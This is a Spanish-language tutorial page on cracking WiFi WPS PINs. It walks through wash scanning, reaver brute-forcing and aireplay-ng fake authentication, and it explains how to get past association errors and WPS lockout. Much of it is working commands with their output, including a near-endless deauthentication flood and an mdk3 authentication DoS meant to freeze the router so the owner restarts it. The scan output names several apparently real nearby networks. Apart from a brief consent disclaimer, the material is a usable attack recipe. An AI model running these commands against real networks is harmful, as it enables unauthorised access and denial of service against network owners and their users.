
# WPS Cracking

{% hint style="danger" %}
**Disclaimer:** Vamos a realizar ataques a redes WiFi, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Características</mark>

* WPS utiliza un pin de 8 dígitos
* Es posible probar todos los pin en poco tiempo
* Se puede utilizar el pin WPS para calcular la contraseña actual

{% hint style="warning" %}
Esto solo funciona si el router está configurado para no usar el PBC (Push Bottom Autentication). Si lo hacen por medio del botón, el equipo no se autenticará por medio del pin de 8 dígitos.
{% endhint %}

En los routers más modernos la opción WPS viene deshabilitada o solo da la opción de PBC.

<figure><img src="/files/n6fg8dVbpiB4A7MIJbSl" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Explotando WPS</mark>

### Wash

`wash` es una herramienta que se utiliza en el hacking de redes WiFi para detectar puntos de acceso cercanos que tienen habilitado el protocolo WPS (WiFi Protected Setup). Esta herramienta escanea los canales inalámbricos en busca de dispositivos con WPS activado para facilitar ataques posteriores, como los realizados con `reaver`. Al usar `wash`, se puede identificar información valiosa sobre las redes, como el BSSID, canal, y el estado de seguridad WPS, lo que permite al atacante decidir cuáles objetivos son más vulnerables.

#### Ver todas las redes cercanas con WPS activado con `wash`

```bash
sudo wash --interface wlan0
 
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
EC:F4:51:A2:32:7C    1  -72  2.0  No   Broadcom  MiFibra-327A
2C:96:82:3B:67:E7    6  -68  2.0  No   Broadcom  TESTING
D8:E8:44:B3:6B:F4   10  -74  2.0  No             DIGIFIBRA-yCtU
C6:8B:92:FA:80:32    6  -68  2.0  No   MarvellS  MIWIFI_hRNd
84:2A:FD:E8:1B:7F    6  -61  2.0  Yes            DIRECT-7B-HP DeskJet 2700 series
58:76:AC:F2:04:60   12  -74  2.0  No   RalinkTe  vodafoneBA7211
62:FF:CE:3D:93:6B    6  -78  2.0  No   Broadcom  vodafoneBA1917_5G
D8:E8:44:B3:AE:00    8  -78  2.0  No             Slytherin
4C:22:F3:59:ED:A6    1  -82  2.0  No   Broadcom  Livebox6-EDA7
80:78:71:FC:D9:5F    6  -88  2.0  No   RalinkTe  DiosTeAma
```

### Reaver

`reaver` es una herramienta utilizada para explotar las vulnerabilidades en el protocolo WPS (WiFi Protected Setup) de redes WiFi. Su objetivo principal es recuperar el PIN WPS del punto de acceso, permitiendo al atacante obtener acceso a la red inalámbrica. Funciona gracias a un ataque de fuerza bruta que envía múltiples solicitudes PIN hasta encontrar el correcto. Al utilizar `reaver`, se pueden superar medidas de seguridad WPS, facilitando un acceso no autorizado en redes que no cuenten con una configuración de seguridad adecuada.

```shell-session
reaver --help

Reaver v1.6.6 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

Required Arguments:
	-i, --interface=<wlan>          Name of the monitor-mode interface to use
	-b, --bssid=<mac>               BSSID of the target AP

Optional Arguments:
	-m, --mac=<mac>                 MAC of the host system
	-e, --essid=<ssid>              ESSID of the target AP
	-c, --channel=<channel>         Set the 802.11 channel for the interface (implies -f)
	-s, --session=<file>            Restore a previous session file
	-C, --exec=<command>            Execute the supplied command upon successful pin recovery
	-f, --fixed                     Disable channel hopping
	-5, --5ghz                      Use 5GHz 802.11 channels
	-v, --verbose                   Display non-critical warnings (-vv or -vvv for more)
	-q, --quiet                     Only display critical messages
	-h, --help                      Show help
```

```bash
sudo reaver --bssid 2C:96:82:3B:67:E7 --channel 6 --interface wlan0 -vv

Reaver v1.6.6 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Switching wlan0 to channel 6
[+] Waiting for beacon from 2C:96:82:3B:67:E7
[+] Received beacon from 2C:96:82:3B:67:E7
[+] Vendor: Broadcom
[+] Trying pin "12345670"
[+] Sending authentication request
[+] Sending association request
[+] Associated with 2C:96:82:3B:67:E7 (ESSID: TESTING)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[!] WARNING: Receive timeout occurred
```

{% hint style="info" %}
Nos puede dar un error de asociación, por lo que haremos un bypass
{% endhint %}

### Bypass del error Failed Associate

Este error nos puede aparecer con los routers mas nuevos y seguros

```bash
# 1 - Ver redes con WPS activado
sudo wash --interface wlan0mon

# 2 - Reaver sin asociarnos al AP (-A)
sudo reaver --bssid 2C:96:82:3B:67:E7 --channel 6 --interface wlan0mon -vv -A

# 3 - Asociarnos manualmente al AP
sudo aireplay-ng --fakeauth 20 -a <MAC-OBJETIVO> -h <MAC-ADAPTADOR> <INTERFAZ> 
```

```bash
sudo aireplay-ng --fakeauth 20 -a 2C:96:82:3B:67:E7 -h 34:7D:E4:40:18:27 wlan0mon
```

```bash
sudo reaver --bssid 2C:96:82:3B:67:E7 --channel 6 --interface wlan0 -vv

Reaver v1.6.6 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Switching wlan0 to channel 6
[+] Waiting for beacon from 2C:96:82:3B:67:E7
[+] Received beacon from 2C:96:82:3B:67:E7
[+] Vendor: Broadcom
[+] Trying pin "12345670"
[+] Sending authentication request
[+] Sending association request
[+] Associated with 2C:96:82:3B:67:E7 (ESSID: TESTING)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[!] WARNING: Receive timeout occurred
[+] Sending WSC NACK
[!] WPS transaction failed (code: 0x03), re-trying last pin
```

{% hint style="info" %}
Nos puede dar un error 0x02 o 0x03, por lo que haremos un bypass
{% endhint %}

### Bypass del error 0x03

* Vamos a hacer un debugging para ver lo que está sucediendo.
* Podemos saber que estamos en presencial del error cuando se queda en 0% en reaver y no avanza

```bash
# 1 - Ver redes con WPS activado
sudo wash --interface wlan0mon

# 2 - Reaver modo debugging -vvv
sudo reaver --bssid 2C:96:82:3B:67:E7 --channel 6 --interface wlan0mon -vvv

# 3 - Asociarnos manualmente al AP
sudo aireplay-ng --fakeauth 20 -a <MAC-OBJETIVO> -h <MAC-ADAPTADOR> <INTERFAZ> 
```

* El error 0x03 es: WPS transaction failed (code: 0x03)

```bash
# Reaver modo --no-nacks
sudo reaver --bssid 2C:96:82:3B:67:E7 --channel 6 --interface wlan0mon -A --no-nacks

Reaver v1.6.6 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 2C:96:82:3B:67:E7
[+] Received beacon from 2C:96:82:3B:67:E7
[+] Vendor: Broadcom
[+] Associated with 2C:96:82:3B:67:E7 (ESSID: TESTING)
```

### Bypass de WPS Lock

El ataque de fuerza bruta sobre WPS se hace probando diversas combinaciones hasta encontrar el pin. Algunos routers nos pueden bloquear después de una cierta cantidad de intentos fallidos.

El problema reside en que una vez estamos bloqueados, el router rechazará todos los pin aunque le enviemos el correcto. Para esto hay 2 soluciones:

* Esperar a que el objetivo reinicie el router
* Tratar de resetear el router

```bash
sudo wash --interface wlan0
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
EC:F4:51:A2:32:7C    1  -60  2.0  No   Broadcom  MiFibra-327A
84:1E:A3:07:F6:80    1  -72  2.0  No   Broadcom  MiFibra-F680
E4:66:AB:4C:2F:14    6  -50  2.0  No   Unknown   DIGIFIBRA-cQT5
2C:96:82:3B:67:E7    6  -62  2.0  Yes  Broadcom  TESTING
                                 |---|
```

```bash
sudo aireplay-ng --deauth 1000000000 -a 2C:96:82:3B:67:E7 wlan0

17:35:29  Waiting for beacon frame (BSSID: 2C:96:82:3B:67:E7) on channel 6
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
17:35:32  Sending DeAuth (code 7) to broadcast -- BSSID: [2C:96:82:3B:67:E7]
17:35:33  Sending DeAuth (code 7) to broadcast -- BSSID: [2C:96:82:3B:67:E7]
17:35:33  Sending DeAuth (code 7) to broadcast -- BSSID: [2C:96:82:3B:67:E7]
17:35:34  Sending DeAuth (code 7) to broadcast -- BSSID: [2C:96:82:3B:67:E7]
17:35:34  Sending DeAuth (code 7) to broadcast -- BSSID: [2C:96:82:3B:67:E7]
17:35:35  Sending DeAuth (code 7) to broadcast -- BSSID: [2C:96:82:3B:67:E7]
17:35:35  Sending DeAuth (code 7) to broadcast -- BSSID: [2C:96:82:3B:67:E7]
17:35:36  Sending DeAuth (code 7) to broadcast -- BSSID: [2C:96:82:3B:67:E7]
17:35:36  Sending DeAuth (code 7) to broadcast -- BSSID: [2C:96:82:3B:67:E7]
17:35:36  Sending DeAuth (code 7) to broadcast -- BSSID: [2C:96:82:3B:67:E7]
...SNIP...
```

El objetivo al quedarse sin conexión pensará que el router tiene un problema y lo reiniciará.

## <mark style="color:purple;">Desbloquear WPS</mark>

MDK3 es una herramienta diseñada para explotar el protocolo 802.11

* Al explotar el router este se puede reiniciar
* Al reiniciarse algunos routers desbloquean sus características WPS

### Iniciamos las pruebas

```bash
sudo mdk3 --help

MDK USAGE:
mdk3 <interface> <test_mode> [test_options]

Try mdk3 --fullhelp for all test options
Try mdk3 --help <test_mode> for info about one test only

TEST MODES:
b   - Beacon Flood Mode
      Sends beacon frames to show fake APs at clients.
      This can sometimes crash network scanners and even drivers!
a   - Authentication DoS mode
      Sends authentication frames to all APs found in range.
      Too much clients freeze or reset some APs.
p   - Basic probing and ESSID Bruteforce mode
      Probes AP and check for answer, useful for checking if SSID has
      been correctly decloaked or if AP is in your adaptors sending range
      SSID Bruteforcing is also possible with this test mode.
d   - Deauthentication / Disassociation Amok Mode
      Kicks everybody found from AP
m   - Michael shutdown exploitation (TKIP)
      Cancels all traffic continuously
x   - 802.1X tests
w   - WIDS/WIPS Confusion
      Confuse/Abuse Intrusion Detection and Prevention Systems
f   - MAC filter bruteforce mode
      This test uses a list of known client MAC Addresses and tries to
      authenticate them to the given AP while dynamically changing
      its response timeout for best performance. It currently works only
      on APs who deny an open authentication request properly
g   - WPA Downgrade test
      deauthenticates Stations and APs sending WPA encrypted packets.
      With this test you can check if the sysadmin will try setting his
      network to WEP or disable encryption.
```

```bash
sudo mdk3 wlan0 a -a 2C:96:82:3B:67:E7 -m

AP 2C:96:82:3B:67:E7 is responding!           
AP 2C:96:82:3B:67:E7 seems to be VULNERABLE and may be frozen!
Needed to connect  491 clients to freeze it.
AP 2C:96:82:3B:67:E7 has returned to functionality!     
AP 2C:96:82:3B:67:E7 seems to be INVULNERABLE!      
Device is still responding with   500 clients connected!
AP 2C:96:82:3B:67:E7 seems to be VULNERABLE and may be frozen!
Needed to connect  512 clients to freeze it.
AP 2C:96:82:3B:67:E7 has returned to functionality! 
...SNIP...
```
